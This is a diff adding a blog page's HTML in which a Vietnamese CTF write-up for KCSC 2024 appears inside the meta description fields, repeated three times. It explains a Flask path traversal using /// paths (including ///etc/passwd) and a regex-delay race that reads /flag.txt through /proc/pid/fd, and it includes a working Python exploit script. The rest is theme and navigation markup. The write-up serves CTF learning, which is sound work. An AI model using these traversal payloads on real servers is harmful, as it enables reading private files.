@@ -1,0 +1,2691 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- `site.alt_lang` can specify a language different from the UI -->
+<html lang="en" >
+  <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta
+    name="viewport"
+    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
+  ><!-- Setup Open Graph image -->
+
+  
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="KCSC 2024" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Bài Ka Tuổi Trẻ Tóm tắt: Challenge này là sử dụng một server flask đơn giản với function đọc file tại endpoint / với params file sau đó thêm ./static vào đằng trước file để đọc file trong thư mục static. Phần sau là kiểm tra file có tồn tại không, dung lượng của file phải bé hơn 2MB và có quyền đọc nó thì sẽ tiếp tục đi qua regex nếu qua thì sẽ trả về nội dung của file đó. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from flask import Flask, request, redirect from os import access, R_OK, stat from os.path import isfile, join, normpath import regex import os app = Flask(__name__, static_url_path=&#39;/static&#39;, static_folder=&#39;static&#39;) @app.get(&#39;/&#39;) def home(): if request.args.get(&#39;file&#39;): filename = join(&quot;./static&quot;, request.args.get(&#39;file&#39;)) if isfile(normpath(filename)) and access(normpath(filename), R_OK) and (stat(normpath(filename)).st_size &lt; 1024 * 1024 * 2): try: with open(normpath(filename), &quot;rb&quot;) as file: if not regex.search(r&#39;^(([ -~])+.)+([(^~\&#39;!*&lt;&gt;:;,?&quot;*|%)]+)|([^\x00-\x7F]+)(([ -~])+.)+$&#39;, filename, timeout=2) and &quot;flag&quot; not in filename: return file.read(1024 * 1024 * 2) except: pass return redirect(&quot;/?file=index.html&quot;) Bài này nhìn vào là có thể nhận ra ngay dính lỗi path traversal khi chỉ dùng normpath để check path của file. Chúng ta có thể đơn giản là thêm /// vào là path của file sẽ được trỏ về root (ví dụ ///etc/passwd) Sau khi biết đây là lỗi path traversal thì mình thử kiểm xem filter của regex có thể bypass được không Đọc xong filter thì thì mình thấy đơn giản regex đầu tiên không có nghĩa gì cả và chặn nếu tên file có chữ flag. Lúc này thì vừa may có gợi ý là File descriptor nên mình nghĩ ra một cách khác File descriptor File descriptor là một định danh độc nhất cho một tập tin cái mà hệ điều hành gán cho nó khi mà mở một file nào đó. Nó cho phép các chương trình tương tác với files, sockets, I/O. File descriptor thường là một số nguyên không âm và được dùng để theo dõi các file và thực hiện thao tác trên nó. Vậy với cái này thì chúng ta sẽ làm gì ? Nhìn vào đoạn code trên khi mở một file trong text mode (‘w’, ‘r’, ‘wt’, ‘rt’, etc.) thì nó sẽ return một subclass của io.TextIOBase. Vậy có nghĩa là sao, có nghĩa là nó sẽ mở một file descriptor khi đọc một file. Ta có thể tận dụng cái này để đọc file thông qua việc không cần đọc qua đường đẫn của nó. Một ví dụ /proc/pid/fd/ Đây là thư mục con chứa các symlink trỏ đến một file nào đó. Trong này luôn có các file 0, 1, 2 tương ứng với 0 là input, 1 là output, 2 là error và các file khác có thể là trỏ đến 1 socket nào đó hoặc 1 file cụ thể Kết hợp hai điều trên ta có thể suy ra được cách giải như sau Khi mà mở 1 file trong text mode thì nó sẽ mở một file descriptor trong proc/pid/fd (pid là mã số của process đó) và file đó lại symlink đến file ta muốn đọc =&gt; đọc file bất kì Ví dụ Vậy để giải bài này thì mình sẽ dùng file descriptor để đọc flag Nhưng mà có một vấn đề là khi mở file thì nó lại đóng file quá nhanh làm mình chưa kịp access vào process id của nó nên bây giờ mình mới để ý phần regex filter của nó. Nếu tên file quá dài thì khi đưa qua regex nó sẽ chạy rất lâu(max là 2 giây) và mình có thể tận dụng khoảng thời gian này để vào proc/pid/fd và đọc file Sau một lúc fuzz thì mình thấy pid của nó nhảy ngẫu nhiên trong các giá trị 1,7,8,9 và file descriptor có tên là 10 sẽ là file symlink đến file mình đọc Vậy ta có thể request đến server với payload /?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt để mở một file descriptor link đến file /flag.txt và do tên quá dài nên regex sẽ bị phải chạy lâu Trong thời gian 2s, mình gửi đến tất cả pid 1,7,8,9 và đọc file descriptor 10 để đọc flag Dưới đây là script để tự động lấy flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import requests import threading import time url = &quot;http://103.163.24.78:8888/?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt&quot; def get(id): r = requests.get(url = f&quot;http://103.163.24.78:8888/?file=///proc/{id}/fd/10&quot;) if &quot;KCSC&quot; in r.text: print(r.text) exit() def start1(): r = requests.get(url = url) if __name__ == &quot;__main__&quot;: threading.Thread(target=start1).start() time.sleep(1) threading.Thread(target=get, args=(1,)).start() threading.Thread(target=get, args=(7,)).start() threading.Thread(target=get, args=(8,)).start() threading.Thread(target=get, args=(9,)).start() Và ra flag" />
+<meta property="og:description" content="Bài Ka Tuổi Trẻ Tóm tắt: Challenge này là sử dụng một server flask đơn giản với function đọc file tại endpoint / với params file sau đó thêm ./static vào đằng trước file để đọc file trong thư mục static. Phần sau là kiểm tra file có tồn tại không, dung lượng của file phải bé hơn 2MB và có quyền đọc nó thì sẽ tiếp tục đi qua regex nếu qua thì sẽ trả về nội dung của file đó. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from flask import Flask, request, redirect from os import access, R_OK, stat from os.path import isfile, join, normpath import regex import os app = Flask(__name__, static_url_path=&#39;/static&#39;, static_folder=&#39;static&#39;) @app.get(&#39;/&#39;) def home(): if request.args.get(&#39;file&#39;): filename = join(&quot;./static&quot;, request.args.get(&#39;file&#39;)) if isfile(normpath(filename)) and access(normpath(filename), R_OK) and (stat(normpath(filename)).st_size &lt; 1024 * 1024 * 2): try: with open(normpath(filename), &quot;rb&quot;) as file: if not regex.search(r&#39;^(([ -~])+.)+([(^~\&#39;!*&lt;&gt;:;,?&quot;*|%)]+)|([^\x00-\x7F]+)(([ -~])+.)+$&#39;, filename, timeout=2) and &quot;flag&quot; not in filename: return file.read(1024 * 1024 * 2) except: pass return redirect(&quot;/?file=index.html&quot;) Bài này nhìn vào là có thể nhận ra ngay dính lỗi path traversal khi chỉ dùng normpath để check path của file. Chúng ta có thể đơn giản là thêm /// vào là path của file sẽ được trỏ về root (ví dụ ///etc/passwd) Sau khi biết đây là lỗi path traversal thì mình thử kiểm xem filter của regex có thể bypass được không Đọc xong filter thì thì mình thấy đơn giản regex đầu tiên không có nghĩa gì cả và chặn nếu tên file có chữ flag. Lúc này thì vừa may có gợi ý là File descriptor nên mình nghĩ ra một cách khác File descriptor File descriptor là một định danh độc nhất cho một tập tin cái mà hệ điều hành gán cho nó khi mà mở một file nào đó. Nó cho phép các chương trình tương tác với files, sockets, I/O. File descriptor thường là một số nguyên không âm và được dùng để theo dõi các file và thực hiện thao tác trên nó. Vậy với cái này thì chúng ta sẽ làm gì ? Nhìn vào đoạn code trên khi mở một file trong text mode (‘w’, ‘r’, ‘wt’, ‘rt’, etc.) thì nó sẽ return một subclass của io.TextIOBase. Vậy có nghĩa là sao, có nghĩa là nó sẽ mở một file descriptor khi đọc một file. Ta có thể tận dụng cái này để đọc file thông qua việc không cần đọc qua đường đẫn của nó. Một ví dụ /proc/pid/fd/ Đây là thư mục con chứa các symlink trỏ đến một file nào đó. Trong này luôn có các file 0, 1, 2 tương ứng với 0 là input, 1 là output, 2 là error và các file khác có thể là trỏ đến 1 socket nào đó hoặc 1 file cụ thể Kết hợp hai điều trên ta có thể suy ra được cách giải như sau Khi mà mở 1 file trong text mode thì nó sẽ mở một file descriptor trong proc/pid/fd (pid là mã số của process đó) và file đó lại symlink đến file ta muốn đọc =&gt; đọc file bất kì Ví dụ Vậy để giải bài này thì mình sẽ dùng file descriptor để đọc flag Nhưng mà có một vấn đề là khi mở file thì nó lại đóng file quá nhanh làm mình chưa kịp access vào process id của nó nên bây giờ mình mới để ý phần regex filter của nó. Nếu tên file quá dài thì khi đưa qua regex nó sẽ chạy rất lâu(max là 2 giây) và mình có thể tận dụng khoảng thời gian này để vào proc/pid/fd và đọc file Sau một lúc fuzz thì mình thấy pid của nó nhảy ngẫu nhiên trong các giá trị 1,7,8,9 và file descriptor có tên là 10 sẽ là file symlink đến file mình đọc Vậy ta có thể request đến server với payload /?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt để mở một file descriptor link đến file /flag.txt và do tên quá dài nên regex sẽ bị phải chạy lâu Trong thời gian 2s, mình gửi đến tất cả pid 1,7,8,9 và đọc file descriptor 10 để đọc flag Dưới đây là script để tự động lấy flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import requests import threading import time url = &quot;http://103.163.24.78:8888/?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt&quot; def get(id): r = requests.get(url = f&quot;http://103.163.24.78:8888/?file=///proc/{id}/fd/10&quot;) if &quot;KCSC&quot; in r.text: print(r.text) exit() def start1(): r = requests.get(url = url) if __name__ == &quot;__main__&quot;: threading.Thread(target=start1).start() time.sleep(1) threading.Thread(target=get, args=(1,)).start() threading.Thread(target=get, args=(7,)).start() threading.Thread(target=get, args=(8,)).start() threading.Thread(target=get, args=(9,)).start() Và ra flag" />
+<link rel="canonical" href="http://localhost:4000/posts/KCSCCTF/" />
+<meta property="og:url" content="http://localhost:4000/posts/KCSCCTF/" />
+<meta property="og:site_name" content="Yuu’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-21T23:00:00+07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="KCSC 2024" />
+<meta name="twitter:site" content="@anzuukino" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-21T23:00:00+07:00","datePublished":"2024-04-21T23:00:00+07:00","description":"Bài Ka Tuổi Trẻ Tóm tắt: Challenge này là sử dụng một server flask đơn giản với function đọc file tại endpoint / với params file sau đó thêm ./static vào đằng trước file để đọc file trong thư mục static. Phần sau là kiểm tra file có tồn tại không, dung lượng của file phải bé hơn 2MB và có quyền đọc nó thì sẽ tiếp tục đi qua regex nếu qua thì sẽ trả về nội dung của file đó. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from flask import Flask, request, redirect from os import access, R_OK, stat from os.path import isfile, join, normpath import regex import os app = Flask(__name__, static_url_path=&#39;/static&#39;, static_folder=&#39;static&#39;) @app.get(&#39;/&#39;) def home(): if request.args.get(&#39;file&#39;): filename = join(&quot;./static&quot;, request.args.get(&#39;file&#39;)) if isfile(normpath(filename)) and access(normpath(filename), R_OK) and (stat(normpath(filename)).st_size &lt; 1024 * 1024 * 2): try: with open(normpath(filename), &quot;rb&quot;) as file: if not regex.search(r&#39;^(([ -~])+.)+([(^~\\&#39;!*&lt;&gt;:;,?&quot;*|%)]+)|([^\\x00-\\x7F]+)(([ -~])+.)+$&#39;, filename, timeout=2) and &quot;flag&quot; not in filename: return file.read(1024 * 1024 * 2) except: pass return redirect(&quot;/?file=index.html&quot;) Bài này nhìn vào là có thể nhận ra ngay dính lỗi path traversal khi chỉ dùng normpath để check path của file. Chúng ta có thể đơn giản là thêm /// vào là path của file sẽ được trỏ về root (ví dụ ///etc/passwd) Sau khi biết đây là lỗi path traversal thì mình thử kiểm xem filter của regex có thể bypass được không Đọc xong filter thì thì mình thấy đơn giản regex đầu tiên không có nghĩa gì cả và chặn nếu tên file có chữ flag. Lúc này thì vừa may có gợi ý là File descriptor nên mình nghĩ ra một cách khác File descriptor File descriptor là một định danh độc nhất cho một tập tin cái mà hệ điều hành gán cho nó khi mà mở một file nào đó. Nó cho phép các chương trình tương tác với files, sockets, I/O. File descriptor thường là một số nguyên không âm và được dùng để theo dõi các file và thực hiện thao tác trên nó. Vậy với cái này thì chúng ta sẽ làm gì ? Nhìn vào đoạn code trên khi mở một file trong text mode (‘w’, ‘r’, ‘wt’, ‘rt’, etc.) thì nó sẽ return một subclass của io.TextIOBase. Vậy có nghĩa là sao, có nghĩa là nó sẽ mở một file descriptor khi đọc một file. Ta có thể tận dụng cái này để đọc file thông qua việc không cần đọc qua đường đẫn của nó. Một ví dụ /proc/pid/fd/ Đây là thư mục con chứa các symlink trỏ đến một file nào đó. Trong này luôn có các file 0, 1, 2 tương ứng với 0 là input, 1 là output, 2 là error và các file khác có thể là trỏ đến 1 socket nào đó hoặc 1 file cụ thể Kết hợp hai điều trên ta có thể suy ra được cách giải như sau Khi mà mở 1 file trong text mode thì nó sẽ mở một file descriptor trong proc/pid/fd (pid là mã số của process đó) và file đó lại symlink đến file ta muốn đọc =&gt; đọc file bất kì Ví dụ Vậy để giải bài này thì mình sẽ dùng file descriptor để đọc flag Nhưng mà có một vấn đề là khi mở file thì nó lại đóng file quá nhanh làm mình chưa kịp access vào process id của nó nên bây giờ mình mới để ý phần regex filter của nó. Nếu tên file quá dài thì khi đưa qua regex nó sẽ chạy rất lâu(max là 2 giây) và mình có thể tận dụng khoảng thời gian này để vào proc/pid/fd và đọc file Sau một lúc fuzz thì mình thấy pid của nó nhảy ngẫu nhiên trong các giá trị 1,7,8,9 và file descriptor có tên là 10 sẽ là file symlink đến file mình đọc Vậy ta có thể request đến server với payload /?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt để mở một file descriptor link đến file /flag.txt và do tên quá dài nên regex sẽ bị phải chạy lâu Trong thời gian 2s, mình gửi đến tất cả pid 1,7,8,9 và đọc file descriptor 10 để đọc flag Dưới đây là script để tự động lấy flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import requests import threading import time url = &quot;http://103.163.24.78:8888/?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt&quot; def get(id): r = requests.get(url = f&quot;http://103.163.24.78:8888/?file=///proc/{id}/fd/10&quot;) if &quot;KCSC&quot; in r.text: print(r.text) exit() def start1(): r = requests.get(url = url) if __name__ == &quot;__main__&quot;: threading.Thread(target=start1).start() time.sleep(1) threading.Thread(target=get, args=(1,)).start() threading.Thread(target=get, args=(7,)).start() threading.Thread(target=get, args=(8,)).start() threading.Thread(target=get, args=(9,)).start() Và ra flag","headline":"KCSC 2024","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/KCSCCTF/"},"url":"http://localhost:4000/posts/KCSCCTF/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <title>KCSC 2024 | Yuu's blog
+  </title>
+
+  <!--
+  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
+  Generated by: https://realfavicongenerator.net/
+-->
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
+
+  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">
+
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
+<meta name="apple-mobile-web-app-title" content="Yuu's blog">
+<meta name="application-name" content="Yuu's blog">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+
+  
+    
+      <link rel="preconnect" href="https://fonts.googleapis.com" >
+      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+    
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
+    
+      <link rel="preconnect" href="https://fonts.googleapis.com" >
+      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+    
+      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+    
+      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
+      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
+    
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+  
+
+  <!-- GA -->
+  
+
+  <!-- Bootstrap -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">
+
+  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
+  
+
+  
+    <!-- Manific Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
+  
+
+  <!-- JavaScript -->
+
+  
+    <!-- Switch the mode between dark and light. -->
+
+<script type="text/javascript">
+  class ModeToggle {
+    static get MODE_KEY() {
+      return 'mode';
+    }
+    static get MODE_ATTR() {
+      return 'data-mode';
+    }
+    static get DARK_MODE() {
+      return 'dark';
+    }
+    static get LIGHT_MODE() {
+      return 'light';
+    }
+    static get ID() {
+      return 'mode-toggle';
+    }
+
+    constructor() {
+      if (this.hasMode) {
+        if (this.isDarkMode) {
+          if (!this.isSysDarkPrefer) {
+            this.setDark();
+          }
+        } else {
+          if (this.isSysDarkPrefer) {
+            this.setLight();
+          }
+        }
+      }
+
+      let self = this;
+
+      /* always follow the system prefers */
+      this.sysDarkPrefers.addEventListener('change', () => {
+        if (self.hasMode) {
+          if (self.isDarkMode) {
+            if (!self.isSysDarkPrefer) {
+              self.setDark();
+            }
+          } else {
+            if (self.isSysDarkPrefer) {
+              self.setLight();
+            }
+          }
+
+          self.clearMode();
+        }
+
+        self.notify();
+      });
+    } /* constructor() */
+
+    get sysDarkPrefers() {
+      return window.matchMedia('(prefers-color-scheme: dark)');
+    }
+
+    get isSysDarkPrefer() {
+      return this.sysDarkPrefers.matches;
+    }
+
+    get isDarkMode() {
+      return this.mode === ModeToggle.DARK_MODE;
+    }
+
+    get isLightMode() {
+      return this.mode === ModeToggle.LIGHT_MODE;
+    }
+
+    get hasMode() {
+      return this.mode != null;
+    }
+
+    get mode() {
+      return sessionStorage.getItem(ModeToggle.MODE_KEY);
+    }
+
+    /* get the current mode on screen */
+    get modeStatus() {
+      if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) {
+        return ModeToggle.DARK_MODE;
+      } else {
+        return ModeToggle.LIGHT_MODE;
+      }
+    }
+
+    setDark() {
+      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
+    }
+
+    setLight() {
+      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
+    }
+
+    clearMode() {
+      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
+      sessionStorage.removeItem(ModeToggle.MODE_KEY);
+    }
+
+    /* Notify another plugins that the theme mode has changed */
+    notify() {
+      window.postMessage(
+        {
+          direction: ModeToggle.ID,
+          message: this.modeStatus
+        },
+        '*'
+      );
+    }
+
+    flipMode() {
+      if (this.hasMode) {
+        if (this.isSysDarkPrefer) {
+          if (this.isLightMode) {
+            this.clearMode();
+          } else {
+            this.setLight();
+          }
+        } else {
+          if (this.isDarkMode) {
+            this.clearMode();
+          } else {
+            this.setDark();
+          }
+        }
+      } else {
+        if (this.isSysDarkPrefer) {
+          this.setLight();
+        } else {
+          this.setDark();
+        }
+      }
+
+      this.notify();
+    } /* flipMode() */
+  } /* ModeToggle */
+
+  const modeToggle = new ModeToggle();
+</script>
+
+  
+
+  <!-- A placeholder to allow defining custom metadata -->
+
+</head>
+
+  <!-- <style>
+    body {
+      background-image: url('/assets/background/background.jpg');
+    }
+    </style> -->
+
+  <body>
+    <!-- The Side Bar -->
+
+<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
+  <header class="profile-wrapper">
+    <a href="/" id="avatar" class="rounded-circle"><img src="https://pbs.twimg.com/profile_images/1771461862468579328/HqACG5Vs_400x400.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>
+
+    <h1 class="site-title">
+      <a href="/">Yuu's blog</a>
+    </h1>
+    <p class="site-subtitle fst-italic mb-0">I will write some CTF writeup here :v</p>
+  </header>
+  <!-- .profile-wrapper -->
+
+  <nav class="flex-column flex-grow-1 w-100 ps-0">
+    <ul class="nav">
+      <!-- home -->
+      <li class="nav-item">
+        <a href="/" class="nav-link">
+          <i class="fa-fw fas fa-home"></i>
+          <span>HOME</span>
+        </a>
+      </li>
+      <!-- the real tabs -->
+      
+        <li class="nav-item">
+          <a href="/categories/" class="nav-link">
+            <i class="fa-fw fas fa-stream"></i>
+            
+
+            <span>CATEGORIES</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+        <li class="nav-item">
+          <a href="/tags/" class="nav-link">
+            <i class="fa-fw fas fa-tags"></i>
+            
+
+            <span>TAGS</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+        <li class="nav-item">
+          <a href="/archives/" class="nav-link">
+            <i class="fa-fw fas fa-archive"></i>
+            
+
+            <span>ARCHIVES</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+        <li class="nav-item">
+          <a href="/about/" class="nav-link">
+            <i class="fa-fw fas fa-info-circle"></i>
+            
+
+            <span>ABOUT</span>
